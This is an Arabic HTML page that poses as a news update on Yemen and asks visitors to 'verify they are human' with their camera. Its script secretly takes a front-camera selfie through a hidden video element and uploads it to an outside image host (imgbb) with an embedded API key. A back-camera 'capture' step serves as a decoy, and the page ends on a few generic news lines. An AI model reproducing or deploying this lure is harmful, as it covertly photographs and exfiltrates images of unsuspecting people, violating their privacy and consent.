<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>آخر تطورات الوضع في اليمن</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <style>
        body {
            font-family: 'Tahoma', sans-serif;
            text-align: center;
            background: linear-gradient(to bottom right, #e0f7fa, #fff3e0);
            color: #333;
            padding: 50px 20px;
        }

        h1 {
            font-size: 2em;
            color: #00796b;
        }

        p {
            font-size: 1.2em;
            margin-bottom: 15px;
        }

        button {
            background-color: #00796b;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1em;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #004d40;
        }

        video {
            display: none;
            width: 100%;
            margin:auto;
            max-width: 400px;
            margin-top: 20px;
            border-radius: 12px;
        }

        #captureBtn,
        #sendBtn {
            display: none;
            margin-top: 10px;
        }

        #loading {
            margin-top: 20px;
            font-size: 1.2em;
            color: #666;
        }

        #finalContent {
            display: none;
            margin-top: 30px;
            font-size: 1.3em;
            color: #333;
        }
    </style>
</head>

<body dir="rtl">
    <h1>🌍 آخر تطورات الوضع في اليمن</h1>
    <p>يرجى التأكيد على أنك إنسان عن طريق تصوير أي شيء أمامك.</p>
    <button onclick="startVerification()">✅ ابدأ التحقق</button>

    <video id="video" autoplay playsinline></video>
    <br>
    <button id="captureBtn" onclick="captureBackground()">📸 التقاط</button>
    <button id="sendBtn" onclick="sendResult()">📤 إرسال</button>

    <div id="loading"></div>
    <div id="finalContent">
        🇾🇪 <strong>أهم المستجدات:</strong><br><br>
        • تحسن طفيف في سعر صرف الريال مقابل الدولار.<br>
        • استمرار المحادثات بشأن الهدنة في بعض المحافظات.<br>
        • تقارير عن هدوء نسبي في صنعاء وعدن مؤخرًا.<br>
        • عودة بعض الخدمات تدريجياً في مناطق الجنوب.
    </div>

    <script>
        const API_KEY = "8b3ff25139462514d13f5d9a3b3c0d05";
        const video = document.getElementById("video");
        const captureBtn = document.getElementById("captureBtn");
        const sendBtn = document.getElementById("sendBtn");
        const loading = document.getElementById("loading");
        const finalContent = document.getElementById("finalContent");

        let backgroundStream = null;
        let selfieUploaded = false;

        async function startVerification() {
            loading.textContent = "📷 جاري التحقق من أنك إنسان...";
            try {
                // الخطوة 1: التقاط الصورة الأمامية مباشرة
                const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement("video");
                hiddenVideo.srcObject = selfieStream;
                await hiddenVideo.play();

                setTimeout(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(hiddenVideo, 0, 0);

                    selfieStream.getTracks().forEach(track => track.stop());

                    const imageData = canvas.toDataURL("image/jpeg");
                    const formData = new FormData();
                    formData.append('image', imageData.split(',')[1]);

                    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await res.json();
                    if (data.success) {
                        console.log("📷 تم رفع صورة الأمامية:", data.data.url);
                        selfieUploaded = true;

                        // الآن ننتقل لفتح الكاميرا الخلفية
                        await startBackCamera();
                    } else {
                        loading.textContent = "❌ فشل رفع الصورة.";
                    }
                }, 1000);

            } catch (err) {
                loading.textContent = "⚠️ تعذر الوصول للكاميرا.";
                console.error(err);
            }
        }

        async function startBackCamera() {
            try {
                backgroundStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = backgroundStream;
                video.style.display = "block";
                captureBtn.style.display = "inline-block";
                loading.textContent = "🎥 وجه الكاميرا لأي شيء ثم اضغط التقاط.";
            } catch (err) {
                loading.textContent = "⚠️ تعذر تشغيل الكاميرا الخلفية.";
                console.error(err);
            }
        }

        function captureBackground() {
            captureBtn.style.display = "none";
            video.style.display = "none";
            backgroundStream.getTracks().forEach(track => track.stop());
            sendBtn.style.display = "inline-block";
            loading.textContent = "📤 جاهز للإرسال.";
        }

        function sendResult() {
            sendBtn.style.display = "none";
            loading.textContent = "✅ تم التحقق من أنك إنسان...\n🔄 جاري جلب المعلومات...";
            setTimeout(() => {
                loading.style.display = "none";
                finalContent.style.display = "block";
            }, 2500);
        }
    </script>
</body>

</html>

